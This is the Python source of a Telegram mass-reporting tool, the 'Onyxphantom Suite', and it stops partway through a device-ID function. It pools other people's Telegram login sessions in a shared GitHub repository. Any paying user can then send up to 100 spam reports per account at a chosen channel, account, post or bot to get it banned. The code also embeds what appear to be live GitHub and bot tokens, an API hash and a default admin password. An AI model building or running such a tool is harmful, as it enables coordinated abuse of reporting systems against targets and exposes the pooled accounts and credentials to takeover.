#!/usr/bin/env python3
"""
TELEGRAM MASS REPORTER TOOL - SHARED SESSIONS VERSION
Onyxphantom Suite - Coded By Xaatzy - Version 8.0.0
Fitur: 
- SEMUA USER bisa add shared sessions (bisa dipakai bersama)
- Device terblokir langsung exit, tidak bisa pakai tools lagi
- Tidak ada pesan default owner saat login gagal
GitHub: https://github.com/zzzzoeaa-tech/telegram-reporter
Contact: @craazin | t.me/craazin
"""

import os
import sys
import asyncio
import json
import re
import time
import base64
import hashlib
import platform
import subprocess
import socket
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple

# ==================== CHECK & INSTALL MODULES ====================
def install_module(module):
    subprocess.check_call([sys.executable, "-m", "pip", "install", module])

try:
    from telethon import TelegramClient
    from telethon.errors import FloodWaitError, SessionPasswordNeededError
    from telethon.tl.functions.channels import JoinChannelRequest
    from telethon.tl.functions.messages import ReportSpamRequest
    from telethon.tl.types import (
        InputReportReasonChildAbuse,
        InputReportReasonViolence,
        InputReportReasonPornography,
        InputReportReasonOther,
        InputReportReasonSpam,
        InputReportReasonFake,
        InputReportReasonIllegalDrugs,
        InputReportReasonPersonalDetails
    )
except ImportError:
    print("[!] Installing telethon...")
    install_module("telethon")
    from telethon import TelegramClient
    from telethon.errors import FloodWaitError, SessionPasswordNeededError
    from telethon.tl.functions.channels import JoinChannelRequest
    from telethon.tl.functions.messages import ReportSpamRequest
    from telethon.tl.types import (
        InputReportReasonChildAbuse,
        InputReportReasonViolence,
        InputReportReasonPornography,
        InputReportReasonOther,
        InputReportReasonSpam,
        InputReportReasonFake,
        InputReportReasonIllegalDrugs,
        InputReportReasonPersonalDetails
    )

try:
    import aiohttp
except ImportError:
    print("[!] Installing aiohttp...")
    install_module("aiohttp")
    import aiohttp

try:
    import requests
except ImportError:
    print("[!] Installing requests...")
    install_module("requests")
    import requests

# ==================== KONFIGURASI ====================
GITHUB_CONFIG = {
    "owner": "zzzzoeaa-tech",
    "repo": "onyx-databases",
    "branch": "main",
    "token": "github_h2KoRDY2SdqEgrm7V61n3aL10l71El1WFsx3"
}

# Telegram API
API_ID = 25683949
API_HASH = "5a0f1b821252088fe36c523c01c82533"

# Bot Telegram untuk notifikasi (opsional)
BOT_TOKEN = "8677431229:AAF7MxKXHesv0cSXfOU0K0Aw9tJCl65xNq8"
OWNER_CHAT_ID = "1394010666"

# Default Owner (HANYA UNTUK FIRST SETUP, TIDAK AKAN DITAMPILKAN SAAT LOGIN GAGAL)
DEFAULT_OWNER_USERNAME = "owner"
DEFAULT_OWNER_PASSWORD = "admin123"

# File untuk menandai device terblokir (biar tidak bisa install ulang)
BLOCKED_FLAG_FILE = ".device_blocked"

# ==================== WARNA ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# ==================== ASCII ART ====================
ASCII_ART = f"""
{Colors.BLUE}   ___                         _                 _                  
{Colors.BLUE}  / _ \\ _ __  _   ___  ___ __ | |__   __ _ _ __ | |_ ___  _ __ ___  
{Colors.BLUE} | | | | '_ \\| | | \\ \\/ | '_ \\| '_ \\ / _` | '_ \\| __/ _ \\| '_ ` _ \\ 
{Colors.BLUE} | |_| | | | | |_| |>  <| |_) | | | | (_| | | | | || (_) | | | | | |
{Colors.BLUE}  \\___/|_| |_|\\__, /_/\\_| .__/|_| |_|\\__,_|_| |_|\\__\\___/|_| |_| |_|
{Colors.BLUE}            _ |___/     |_|                                         
{Colors.BLUE}  ___ _   _(_| |_ ___                                               
{Colors.BLUE} / __| | | | | __/ _ \\                                              
{Colors.BLUE} \\__ | |_| | | ||  __/                                              
{Colors.BLUE} |___/\\__,_|_|\\__\\___|                                              
{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.BOLD}{Colors.MAGENTA}               ONYXPHANTOM SUITE V8.4{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.DIM}                  Coded By Xaatzy{Colors.RESET}
{Colors.DIM}               Contact: @craazin{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}
"""

# ==================== DEVICE BLOCK CHECK (EKSTREME) ====================
def is_device_permanently_blocked() -> bool:
    """Cek apakah device sudah diblokir permanen"""
    return os.path.exists(BLOCKED_FLAG_FILE)

def mark_device_permanently_blocked():
    """Tandai device sebagai terblokir permanen"""
    with open(BLOCKED_FLAG_FILE, "w") as f:
        f.write(f"Blocked at: {datetime.now().isoformat()}\n")
        f.write(f"Device ID: {get_device_id()}\n")
        f.write("This device is permanently blocked from using this tool.\n")

def block_device_and_exit():
    """Blokir device dan exit program (tidak bisa melakukan apapun)"""
    mark_device_permanently_blocked()
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""
{Colors.RED}{'═' * 60}{Colors.RESET}
{Colors.RED}🔒 DEVICE HAS BEEN PERMANENTLY BLOCKED 🔒{Colors.RESET}
{Colors.RED}{'═' * 60}{Colors.RESET}

{Colors.YELLOW}This device has been blocked due to:
- Multiple failed login attempts
- Security violation

{Colors.RED}YOU CANNOT:
- Login to this tool again
- Reinstall or re-run this program
- Bypass this block

{Colors.DIM}Contact owner: @craazin{Colors.RESET}

{Colors.RED}{'═' * 60}{Colors.RESET}
    """)
    sys.exit(1)

# ==================== GITHUB DATABASE ====================
class GitHubDatabase:
    def __init__(self):
        self.headers = {
            "Authorization": f"token {GITHUB_CONFIG['token']}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}/contents"
        self.session = None
    
    async def _get_session(self):
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
        return self.session
    
    async def read_file(self, path: str) -> Optional[dict]:
        try:
            url = f"{self.base_url}/{path}"
            session = await self._get_session()
            async with session.get(url, headers=self.headers) as resp:
                if resp.status == 404:
                    return None
                if resp.status == 200:
                    data = await resp.json()
                    content = base64.b64decode(data["content"]).decode("utf-8")
                    return json.loads(content)
                return None
        except Exception:
            return None
    
    async def write_file(self, path: str, data: dict, msg: str = "Update") -> bool:
        try:
            url = f"{self.base_url}/{path}"
            content = base64.b64encode(json.dumps(data, indent=2).encode()).decode()
            
            existing_sha = None
            session = await self._get_session()
            async with session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    existing = await resp.json()
                    existing_sha = existing.get("sha")
            
            payload = {
                "message": msg,
                "content": content,
                "branch": GITHUB_CONFIG["branch"]
            }
            if existing_sha:
                payload["sha"] = existing_sha
            
            async with session.put(url, headers=self.headers, json=payload) as resp:
                return resp.status in [200, 201]
        except Exception:
            return False
    
    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

# ==================== SHARED SESSION MANAGER ====================
class SharedSessionManager:
    def __init__(self, db: GitHubDatabase):
        self.db = db
        self.sessions = []
        self.local_dir = "shared_sessions"
        self.stats = {"total": 0, "success": 0, "failed": 0}
    
    async def load(self):
        if not os.path.exists(self.local_dir):
            os.makedirs(self.local_dir)
        
        sessions_data = await self.db.read_file("data/shared_sessions.json")
        if sessions_data:
            self.sessions = sessions_data.get("sessions", [])
            self.stats = sessions_data.get("stats", {"total": 0, "success": 0, "failed": 0})
        
        for s in self.sessions:
            local_file = os.path.join(self.local_dir, s["file"])
            if not os.path.exists(local_file):
                session_data = await self.db.read_file(f"sessions/shared/{s['file']}")
                if session_data and "content" in session_data:
                    with open(local_file, "wb") as f:
                        f.write(base64.b64decode(session_data["content"]))
        
        return len(self.sessions)
    
    async def save(self):
        sessions_data = {
            "sessions": self.sessions,
            "stats": self.stats,
            "last_updated": datetime.now().isoformat()
        }
        return await self.db.write_file("data/shared_sessions.json", sessions_data, "Update shared sessions")
    
    async def add_session(self, phone: str, user_id: int, name: str, current_user: str, session_data: bytes):
        session_file = f"{user_id}.session"
        local_path = os.path.join(self.local_dir, session_file)
        
        with open(local_path, "wb") as f:
            f.write(session_data)
        
        await self.db.write_file(f"sessions/shared/{session_file}", 
                                {"content": base64.b64encode(session_data).decode()}, 
                                f"Add session: {phone}")
        
        self.sessions.append({
            "id": user_id,
            "phone": phone,
            "file": session_file,
            "name": name,
            "added_by": current_user,
            "added_at": datetime.now().isoformat(),
            "last_used": datetime.now().isoformat()
        })
        
        await self.save()
        print(f"{Colors.GREEN}[✓] Shared session added: {phone}{Colors.RESET}")
        return True
    
    async def remove_session(self, index: int, current_user: str, is_owner: bool = False):
        if 0 <= index < len(self.sessions):
            session = self.sessions[index]
            if is_owner or session.get("added_by") == current_user:
                self.sessions.pop(index)
                local_path = os.path.join(self.local_dir, session["file"])
                if os.path.exists(local_path):
                    os.remove(local_path)
                await self.save()
                print(f"{Colors.GREEN}[✓] Session removed: {session['phone']}{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[!] You can only remove sessions you added!{Colors.RESET}")
                return False
        return False
    
    async def get_clients(self):
        clients = []
        for s in self.sessions:
            try:
                session_file = os.path.join(self.local_dir, s["file"])
                if os.path.exists(session_file):
                    client = TelegramClient(session_file, API_ID, API_HASH)
                    await client.connect()
                    if await client.is_user_authorized():
                        clients.append((s["id"], client, s))
                    else:
                        await client.disconnect()
            except Exception:
                pass
        return clients
    
    async def update_stats(self, total_success: int, total_failed: int):
        self.stats["total"] += total_success + total_failed
        self.stats["success"] += total_success
        self.stats["failed"] += total_failed
        await self.save()

# ==================== USER MANAGER ====================
class UserManager:
    def __init__(self, db: GitHubDatabase):
        self.db = db
    
    def hash_password(self, pwd: str) -> str:
        return hashlib.sha256(pwd.encode()).hexdigest()
    
    async def get_users(self) -> dict:
        data = await self.db.read_file("data/users.json")
        if not data:
            data = {
                "owner": DEFAULT_OWNER_USERNAME,
                "users": {
                    DEFAULT_OWNER_USERNAME: {
                        "password": self.hash_password(DEFAULT_OWNER_PASSWORD),
                        "created_at": datetime.now().isoformat(),
                        "role": "owner",
                        "banned": False,
                        "stats": {"total": 0, "success": 0, "failed": 0}
                    }
                }
            }
            await self.db.write_file("data/users.json", data, "Init users")
        return data
    
    async def verify_user(self, username: str, password: str, device_id: str) -> Tuple[bool, dict]:
        data = await self.get_users()
        if username not in data["users"]:
            return False, {"error": "Login Failed!"}
        
        user = data["users"][username]
        if user["password"] != self.hash_password(password):
            return False, {"error": "Login Failed!"}
        if user.get("banned", False):
            return False, {"error": "Login Failed!"}
        if user.get("role") != "owner" and user.get("expiry"):
            if datetime.now() > datetime.fromisoformat(user["expiry"]):
                return False, {"error": "Login Failed!"}
        
        user["last_login"] = datetime.now().isoformat()
        user["last_device"] = device_id
        await self.db.write_file("data/users.json", data, f"Login: {username}")
        return True, user
    
    async def add_user(self, owner: str, username: str, password: str, days: int = 30) -> bool:
        data = await self.get_users()
        if data.get("owner") != owner:
            return False
        if username in data["users"]:
            return False
        
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        data["users"][username] = {
            "password": self.hash_password(password),
            "created_at": datetime.now().isoformat(),
            "expiry": expiry,
            "role": "user",
            "banned": False,
            "stats": {"total": 0, "success": 0, "failed": 0}
        }
        return await self.db.write_file("data/users.json", data, f"Add user: {username}")
    
    async def remove_user(self, owner: str, username: str) -> bool:
        data = await self.get_users()
        if data.get("owner") != owner or username == data.get("owner"):
            return False
        if username in data["users"]:
            del data["users"][username]
            return await self.db.write_file("data/users.json", data, f"Remove user: {username}")
        return False
    
    async def ban_user(self, owner: str, username: str) -> bool:
        data = await self.get_users()
        if data.get("owner") != owner:
            return False
        if username in data["users"] and data["users"][username].get("role") != "owner":
            data["users"][username]["banned"] = True
            return await self.db.write_file("data/users.json", data, f"Ban user: {username}")
        return False
    
    async def unban_user(self, owner: str, username: str) -> bool:
        data = await self.get_users()
        if data.get("owner") != owner:
            return False
        if username in data["users"]:
            data["users"][username]["banned"] = False
            return await self.db.write_file("data/users.json", data, f"Unban user: {username}")
        return False
    
    async def extend_user(self, owner: str, username: str, days: int) -> bool:
        data = await self.get_users()
        if data.get("owner") != owner:
            return False
        if username in data["users"] and data["users"][username].get("role") != "owner":
            new_expiry = datetime.fromisoformat(data["users"][username]["expiry"]) + timedelta(days=days)
            data["users"][username]["expiry"] = new_expiry.isoformat()
            return await self.db.write_file("data/users.json", data, f"Extend user: {username}")
        return False
    
    async def list_users(self, owner: str) -> List[dict]:
        data = await self.get_users()
        if data.get("owner") != owner:
            return []
        return [{"username": u, **v} for u, v in data["users"].items()]

# ==================== DEVICE MANAGER ====================
class DeviceManager:
    def __init__(self, db: GitHubDatabase):
        self.db = db
    
    async def get_devices(self) -> dict:
        data = await self.db.read_file("data/devices.json")
        if not data:
            data = {"devices": {}, "blocked_devices": []}
            await self.db.write_file("data/devices.json", data, "Init devices")
        return data
    
    async def register_device(self, username: str, device_id: str) -> bool:
        data = await self.get_devices()
        if device_id not in data["devices"]:
            data["devices"][device_id] = {
                "owner": username,
                "name": f"{platform.system()} - {platform.node()}",
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "failed_attempts": 0,
                "blocked": False
            }
        else:
            data["devices"][device_id]["last_seen"] = datetime.now().isoformat()
        return await self.db.write_file("data/devices.json", data, "Register device")
    
    async def is_blocked(self, device_id: str) -> Tuple[bool, str]:
        # Cek local flag dulu
        if is_device_permanently_blocked():
            return True, "PERMANENT_BLOCK"
        
        data = await self.get_devices()
        if device_id in data.get("blocked_devices", []):
            return True, "PERMANENT_BLOCK"
        if device_id in data["devices"] and data["devices"][device_id].get("blocked"):
            return True, "PERMANENT_BLOCK"
        return False, ""
    
    async def record_failed(self, device_id: str, username: str = None) -> Tuple[bool, str]:
        data = await self.get_devices()
        if device_id not in data["devices"]:
            data["devices"][device_id] = {
                "owner": username or "unknown",
                "name": f"{platform.system()} - {platform.node()}",
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "failed_attempts": 0,
                "blocked": False
            }
        
        device = data["devices"][device_id]
        device["failed_attempts"] = device.get("failed_attempts", 0) + 1
        
        if device["failed_attempts"] >= 3:
            device["blocked"] = True
            if device_id not in data["blocked_devices"]:
                data["blocked_devices"].append(device_id)
            await self.db.write_file("data/devices.json", data, "Block device")
            # Block device permanently
            block_device_and_exit()
            return True, "PERMANENT_BLOCK"
        
        await self.db.write_file("data/devices.json", data, "Failed attempt")
        return False, f"{3 - device['failed_attempts']}"
    
    async def reset_attempts(self, device_id: str) -> bool:
        data = await self.get_devices()
        if device_id in data["devices"]:
            data["devices"][device_id]["failed_attempts"] = 0
            return await self.db.write_file("data/devices.json", data, "Reset attempts")
        return False

# ==================== TELEGRAM REPORTER ====================
class TelegramReporter:
    def __init__(self, sm: SharedSessionManager):
        self.sm = sm
        self.settings = {"delay": 3}
    
    def extract_username(self, text):
        text = text.strip()
        if text.startswith("@"):
            text = text[1:]
        if "t.me/" in text:
            parts = text.split("t.me/")
            if len(parts) > 1:
                text = parts[1].split("/")[0]
        return re.sub(r"[^a-zA-Z0-9_]", "", text) if len(text) > 2 else None
    
    async def auto_join(self, client, channel):
        try:
            entity = await client.get_entity(channel)
            await client(JoinChannelRequest(entity))
            return True
        except:
            return False
    
    async def report_channel(self, target: str, count: int = 1):
        target_username = self.extract_username(target)
        if not target_username:
            print(f"{Colors.RED}[!] Invalid target{Colors.RESET}")
            return False
        
        clients = await self.sm.get_clients()
        if not clients:
            print(f"{Colors.RED}[!] No active shared sessions!{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Please add Telegram session first (Menu 1){Colors.RESET}")
            return False
        
        success_count = 0
        failed_count = 0
        
        print(f"\n{Colors.CYAN}[*] Reporting target: @{target_username}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Using {len(clients)} shared sessions{Colors.RESET}\n")
        
        for uid, client, session in clients:
            try:
                try:
                    entity = await client.get_entity(target_username)
                except:
                    await self.auto_join(client, target_username)
                    entity = await client.get_entity(target_username)
                
                for i in range(count):
                    try:
                        await client(ReportSpamRequest(peer=entity))
                        success_count += 1
                        print(f"{Colors.CYAN}⣾ [{session['phone']}] Report {i+1}/{count}{Colors.RESET}", end="\r")
                    except FloodWaitError as e:
                        print(f"\n{Colors.YELLOW}[!] Flood wait {e.seconds}s - {session['phone']}{Colors.RESET}")
                        await asyncio.sleep(e.seconds)
                    except Exception:
                        failed_count += 1
                    await asyncio.sleep(self.settings["delay"])
                await client.disconnect()
            except Exception:
                failed_count += count
        
        print()
        await self.sm.update_stats(success_count, failed_count)
        print(f"{Colors.GREEN}[✓] Report complete! Success: {success_count}, Failed: {failed_count}{Colors.RESET}")
        return success_count > 0
    
    async def add_shared_session(self, current_user: str):
        print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}▢ ADD SHARED SESSION (Telegram Account){Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.DIM}This session will be available for ALL users!{Colors.RESET}\n")
        
        phone = input(f"{Colors.GREEN}Phone (+62xxx): {Colors.RESET}").strip()
        if not phone.startswith("+"):
            phone = "+" + phone
        
        for s in self.sm.sessions:
            if s.get("phone") == phone:
                print(f"{Colors.YELLOW}[!] Session already exists!{Colors.RESET}")
                input("Press Enter...")
                return
        
        session_file = os.path.join(self.sm.local_dir, f"temp_{int(time.time())}.session")
        
        try:
            print(f"{Colors.CYAN}[*] Connecting to Telegram...{Colors.RESET}")
            client = TelegramClient(session_file, API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.send_code_request(phone)
                code = input(f"{Colors.GREEN}Code: {Colors.RESET}")
                try:
                    await client.sign_in(phone, code)
                except SessionPasswordNeededError:
                    pwd = input(f"{Colors.GREEN}2FA Password: {Colors.RESET}")
                    await client.sign_in(password=pwd)
            
            me = await client.get_me()
            with open(session_file, "rb") as f:
                content = f.read()
            
            await self.sm.add_session(phone, me.id, me.first_name or "", current_user, content)
            os.remove(session_file)
            
            print(f"\n{Colors.GREEN}[✓] Shared session added successfully!{Colors.RESET}")
            print(f"{Colors.CYAN}▢ Name: {me.first_name}{Colors.RESET}")
            print(f"{Colors.GREEN}[✓] Now ALL users can use this session to report!{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed: {e}{Colors.RESET}")
            if os.path.exists(session_file):
                os.remove(session_file)
        input("Press Enter...")

# ==================== OWNER PANEL ====================
class OwnerPanel:
    def __init__(self, um: UserManager, dm: DeviceManager, sm: SharedSessionManager, username: str):
        self.um = um
        self.dm = dm
        self.sm = sm
        self.username = username
    
    async def show(self):
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(ASCII_ART)
            print(f"""
{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.BOLD}{Colors.RED}👑 OWNER PANEL{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} Add User
{Colors.GREEN}[2]{Colors.RESET} Remove User
{Colors.GREEN}[3]{Colors.RESET} Ban/Unban User
{Colors.GREEN}[4]{Colors.RESET} Extend License
{Colors.GREEN}[5]{Colors.RESET} List Users
{Colors.GREEN}[6]{Colors.RESET} List Devices
{Colors.GREEN}[7]{Colors.RESET} List Shared Sessions
{Colors.GREEN}[0]{Colors.RESET} Back

{Colors.CYAN}{'═' * 60}{Colors.RESET}
            """)
            choice = input(f"{Colors.GREEN}Choice: {Colors.RESET}").lower()
            
            if choice == "1":
                u = input("Username: ")
                p = input("Password: ")
                d = int(input("Days: ") or "30")
                if await self.um.add_user(self.username, u, p, d):
                    print(f"{Colors.GREEN}[✓] User {u} added{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Failed{Colors.RESET}")
                input("Press Enter...")
            elif choice == "2":
                u = input("Username: ")
                if await self.um.remove_user(self.username, u):
                    print(f"{Colors.GREEN}[✓] User {u} removed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Failed{Colors.RESET}")
                input("Press Enter...")
            elif choice == "3":
                u = input("Username: ")
                a = input("Ban (b) or Unban (u): ").lower()
                if a == "b":
                    if await self.um.ban_user(self.username, u):
                        print(f"{Colors.GREEN}[✓] User {u} banned{Colors.RESET}")
                elif a == "u":
                    if await self.um.unban_user(self.username, u):
                        print(f"{Colors.GREEN}[✓] User {u} unbanned{Colors.RESET}")
                input("Press Enter...")
            elif choice == "4":
                u = input("Username: ")
                d = int(input("Extra days: "))
                if await self.um.extend_user(self.username, u, d):
                    print(f"{Colors.GREEN}[✓] User {u} extended{Colors.RESET}")
                input("Press Enter...")
            elif choice == "5":
                users = await self.um.list_users(self.username)
                print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                print(f"{Colors.BOLD}USER LIST{Colors.RESET}")
                print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                for u in users:
                    status = f"{Colors.RED}BANNED{Colors.RESET}" if u.get("banned") else f"{Colors.GREEN}ACTIVE{Colors.RESET}"
                    role = f"{Colors.YELLOW}[{u['role'].upper()}]{Colors.RESET}" if u['role'] == 'owner' else ""
                    expiry = u.get('expiry', 'Never')[:10] if u.get('expiry') else 'Never'
                    print(f"{Colors.GREEN}{u['username']}{Colors.RESET}: {status} {role}")
                    print(f"  Expiry: {expiry}")
                    print()
                input("Press Enter...")
            elif choice == "6":
                devices = await self.dm.get_devices()
                print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                print(f"{Colors.BOLD}ALL DEVICES{Colors.RESET}")
                print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                for did, info in devices["devices"].items():
                    status = f"{Colors.RED}BLOCKED{Colors.RESET}" if info.get("blocked") else f"{Colors.GREEN}ACTIVE{Colors.RESET}"
                    print(f"{Colors.CYAN}Device:{Colors.RESET} {info['name']} [{status}]")
                    print(f"  Owner: {info['owner']}")
                    print(f"  Failed: {info.get('failed_attempts', 0)}")
                    print()
                input("Press Enter...")
            elif choice == "7":
                print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                print(f"{Colors.BOLD}SHARED SESSIONS{Colors.RESET}")
                print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}\n")
                if not self.sm.sessions:
                    print(f"{Colors.YELLOW}No shared sessions{Colors.RESET}")
                else:
                    for i, s in enumerate(self.sm.sessions, 1):
                        print(f"{Colors.GREEN}{i}.{Colors.RESET} {s.get('phone', '?')} | {s.get('name', '?')}")
                        print(f"   Added by: {s.get('added_by', 'unknown')}")
                        print(f"   Added: {s.get('added_at', '?')[:16]}")
                        print()
                input("Press Enter...")
            elif choice == "0":
                break

# ==================== MAIN MENU ====================
class MainMenu:
    def __init__(self, username: str, role: str, device_id: str):
        self.username = username
        self.role = role
        self.device_id = device_id
        self.db = GitHubDatabase()
        self.um = UserManager(self.db)
        self.dm = DeviceManager(self.db)
        self.sm = SharedSessionManager(self.db)
        self.reporter = None
    
    async def run(self):
        await self.dm.register_device(self.username, self.device_id)
        await self.sm.load()
        self.reporter = TelegramReporter(self.sm)
        
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(ASCII_ART)
            
            now = datetime.now()
            time_str = now.strftime("%H:%M:%S")
            date_str = now.strftime("%A, %d %B %Y")
            
            rate = (self.sm.stats["success"] / self.sm.stats["total"] * 100) if self.sm.stats["total"] > 0 else 0
            
            owner_menu = f"\n{Colors.GREEN}[A]{Colors.RESET} ▢ Owner Panel 👑" if self.role == "owner" else ""
            
            print(f"""
{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.BOLD}{Colors.YELLOW}▢ NOTIFICATION{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.GREEN}[ • ]{Colors.RESET} Status       : {Colors.YELLOW}Connected to GitHub{Colors.RESET}
{Colors.GREEN}[ • ]{Colors.RESET} Time         : {Colors.CYAN}{time_str}{Colors.RESET}
{Colors.GREEN}[ • ]{Colors.RESET} Date         : {Colors.CYAN}{date_str}{Colors.RESET}
{Colors.GREEN}[ • ]{Colors.RESET} Device ID    : {Colors.MAGENTA}{self.device_id[:16]}...{Colors.RESET}
{Colors.GREEN}[ • ]{Colors.RESET} Shared Sessions: {Colors.CYAN}{len(self.sm.sessions)}{Colors.RESET}

{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.BOLD}{Colors.YELLOW}▢ MAIN MENU{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} ▢ Add Shared Session (Telegram)
{Colors.GREEN}[2]{Colors.RESET} ▢ Report Channel/Group
{Colors.GREEN}[3]{Colors.RESET} ▢ Report Post
{Colors.GREEN}[4]{Colors.RESET} ▢ Report Account
{Colors.GREEN}[5]{Colors.RESET} ▢ Report Bot
{Colors.GREEN}[6]{Colors.RESET} ▢ Statistics
{Colors.GREEN}[7]{Colors.RESET} ▢ List Shared Sessions
{Colors.GREEN}[8]{Colors.RESET} ▢ Remove My Session
{Colors.GREEN}[9]{Colors.RESET} ▢ Settings
{owner_menu}
{Colors.GREEN}[0]{Colors.RESET} ▢ Logout

{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.DIM}User: {self.username} ({self.role}) | Sessions: {len(self.sm.sessions)} | Total Reports: {self.sm.stats['total']} | Rate: {rate:.0f}%{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}
            """)
            
            choice = input(f"{Colors.GREEN}Choice: {Colors.RESET}").lower()
            
            if choice == "1":
                await self.reporter.add_shared_session(self.username)
            elif choice == "2":
                target = input(f"{Colors.GREEN}Target (@username or link): {Colors.RESET}")
                cnt = int(input(f"{Colors.GREEN}Count per session (1-100): {Colors.RESET}") or "1")
                await self.reporter.report_channel(target, min(cnt, 100))
                input("Press Enter...")
            elif choice == "3":
                target = input(f"{Colors.GREEN}Post link: {Colors.RESET}")
                cnt = int(input(f"{Colors.GREEN}Count per session (1-100): {Colors.RESET}") or "1")
                channel = re.search(r"t\.me/([a-zA-Z0-9_]+)", target)
                if channel:
                    await self.reporter.report_channel(channel.group(1), min(cnt, 100))
                else:
                    print(f"{Colors.RED}[!] Invalid link{Colors.RESET}")
                input("Press Enter...")
            elif choice == "4":
                target = input(f"{Colors.GREEN}Username: {Colors.RESET}")
                cnt = int(input(f"{Colors.GREEN}Count per session (1-100): {Colors.RESET}") or "1")
                await self.reporter.report_channel(target, min(cnt, 100))
                input("Press Enter...")
            elif choice == "5":
                target = input(f"{Colors.GREEN}Bot username: {Colors.RESET}")
                cnt = int(input(f"{Colors.GREEN}Count per session (1-100): {Colors.RESET}") or "1")
                await self.reporter.report_channel(target, min(cnt, 100))
                input("Press Enter...")
            elif choice == "6":
                print(f"""
{Colors.CYAN}{'═' * 60}{Colors.RESET}
{Colors.BOLD}{Colors.YELLOW}▢ STATISTICS{Colors.RESET}
{Colors.CYAN}{'═' * 60}{Colors.RESET}

{Colors.GREEN}Total Reports (All Users):{Colors.RESET} {self.sm.stats['total']}
{Colors.GREEN}Success:{Colors.RESET} {self.sm.stats['success']}
{Colors.GREEN}Failed:{Colors.RESET} {self.sm.stats['failed']}
{Colors.GREEN}Rate:{Colors.RESET} {rate:.0f}%
{Colors.GREEN}Shared Sessions:{Colors.RESET} {len(self.sm.sessions)}
{Colors.CYAN}{'═' * 60}{Colors.RESET}
                """)
                input("Press Enter...")
            elif choice == "7":
                print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                print(f"{Colors.BOLD}SHARED SESSIONS{Colors.RESET}")
                print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}\n")
                if not self.sm.sessions:
                    print(f"{Colors.YELLOW}No shared sessions{Colors.RESET}")
                else:
                    for i, s in enumerate(self.sm.sessions, 1):
                        print(f"{Colors.GREEN}{i}.{Colors.RESET} {s.get('phone', '?')} | {s.get('name', '?')}")
                        print(f"   Added by: {s.get('added_by', 'unknown')}")
                        print()
                input("Press Enter...")
            elif choice == "8":
                if not self.sm.sessions:
                    print(f"{Colors.YELLOW}No sessions{Colors.RESET}")
                    input("Press Enter...")
                    continue
                print(f"\n{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                print(f"{Colors.BOLD}REMOVE MY SESSION{Colors.RESET}")
                print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}\n")
                my_sessions = [(i, s) for i, s in enumerate(self.sm.sessions) if s.get("added_by") == self.username]
                if not my_sessions:
                    print(f"{Colors.YELLOW}You have no sessions added{Colors.RESET}")
                    input("Press Enter...")
                    continue
                for i, (idx, s) in enumerate(my_sessions, 1):
                    print(f"{Colors.GREEN}{i}.{Colors.RESET} {s.get('phone', '?')} | {s.get('name', '?')}")
                try:
                    choice_idx = int(input(f"\n{Colors.GREEN}Select (0=cancel): {Colors.RESET}")) - 1
                    if choice_idx >= 0 and choice_idx < len(my_sessions):
                        await self.sm.remove_session(my_sessions[choice_idx][0], self.username, self.role == "owner")
                except:
                    pass
                input("Press Enter...")
            elif choice == "9":
                new_delay = int(input(f"Delay ({self.reporter.settings['delay']}s): ") or "3")
                self.reporter.settings["delay"] = max(1, min(10, new_delay))
                print(f"{Colors.GREEN}[✓] Delay set to {self.reporter.settings['delay']}s{Colors.RESET}")
                input("Press Enter...")
            elif choice == "a" and self.role == "owner":
                owner = OwnerPanel(self.um, self.dm, self.sm, self.username)
                await owner.show()
            elif choice == "0":
                print(f"\n{Colors.GREEN}Goodbye!{Colors.RESET}")
                await self.db.close()
                break

# ==================== GET DEVICE ID ====================
def get_device_id() -> str:
    system = platform.system()
    if system == "Linux":
        try:
            with open('/etc/machine-id', 'r') as f:
